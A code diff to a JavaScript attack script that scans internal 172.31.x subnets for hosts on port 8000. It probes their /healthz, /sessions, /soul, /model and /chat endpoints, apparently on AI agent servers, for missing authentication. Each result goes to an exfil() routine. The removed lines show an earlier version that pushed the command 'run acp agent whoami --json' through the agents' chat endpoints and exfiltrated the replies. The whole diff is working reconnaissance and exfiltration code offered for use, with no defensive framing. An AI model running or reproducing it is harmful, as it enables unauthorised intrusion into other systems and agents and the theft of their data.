@@ -15,6 +15,18 @@ function tcpScan(host, port, timeout = 100) {
   });
 }
 
+function httpGet(host, port, path, timeout = 3000) {
+  return new Promise((resolve) => {
+    const req = http.get({ hostname: host, port, path, timeout }, (res) => {
+      let data = '';
+      res.on('data', c => { if (data.length < 2000) data += c; });
+      res.on('end', () => resolve({ status: res.statusCode, body: data.slice(0, 500) }));
+    });
+    req.on('error', (e) => resolve({ error: e.message }));
+    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
+  });
+}
+
 function httpPost(host, port, path, body, headers = {}, timeout = 30000) {
   return new Promise((resolve) => {
     const data = JSON.stringify(body);
@@ -24,8 +36,8 @@ function httpPost(host, port, path, body, headers = {}, timeout = 30000) {
     };
     const req = http.request(opts, (res) => {
       let resp = '';
-      res.on('data', c => { if (resp.length < 5000) resp += c; });
-      res.on('end', () => resolve({ status: res.statusCode, body: resp }));
+      res.on('data', c => { if (resp.length < 2000) resp += c; });
+      res.on('end', () => resolve({ status: res.statusCode, body: resp.slice(0, 500) }));
     });
     req.on('error', (e) => resolve({ error: e.message }));
     req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
@@ -52,32 +64,37 @@ function exfil(data) {
 }
 
 async function run() {
-  await exfil({ status: 'Scan started' });
+  await exfil({ status: 'Auth check started' });
 
-  const subnets = ['172.31.154', '172.31.155', '172.31.150', '172.31.157', '172.31.161', '172.31.162', '172.31.163', '172.31.164', '172.31.165', '172.31.149'];
-
+  const subnets = ['172.31.154', '172.31.155', '172.31.149'];
   let found = [];
   for (const subnet of subnets) {
-    if (found.length >= 5) break;
+    if (found.length >= 8) break;
     const hosts = Array.from({ length: 255 }, (_, i) => `${subnet}.${i + 1}`);
     for (let i = 0; i < hosts.length; i += 100) {
-      if (found.length >= 5) break;
+      if (found.length >= 8) break;
       const batch = hosts.slice(i, i + 100);
       const results = await Promise.all(batch.map(h => tcpScan(h, 8000)));
       found.push(...results.filter(Boolean));
     }
   }
 
-  found = found.slice(0, 5);
-  await exfil({ status: 'Sending /chat to 5 agents in parallel', targets: found });
+  found = found.slice(0, 8);
 
-  // Fire all /chat requests in parallel, exfil each result as it arrives
+  // Check multiple endpoints on each to see what's authed vs not
   await Promise.all(found.map(async (host) => {
-    const result = await httpPost(host, 8000, '/chat',
-      { message: 'run acp agent whoami --json' },
-      { 'x-session-key': 'whoami-scan-4' }
-    );
-    await exfil({ host, result });
+    const checks = {
+      host,
+      healthz: await httpGet(host, 8000, '/healthz'),
+      sessions: await httpGet(host, 8000, '/sessions'),
+      soul: await httpGet(host, 8000, '/soul'),
+      model: await httpGet(host, 8000, '/model'),
+      chat: await httpPost(host, 8000, '/chat',
+        { message: 'hi' },
+        { 'x-session-key': 'test-1' }
+      ),
+    };
+    await exfil(checks);
   }));
 
   await exfil({ status: 'done' });
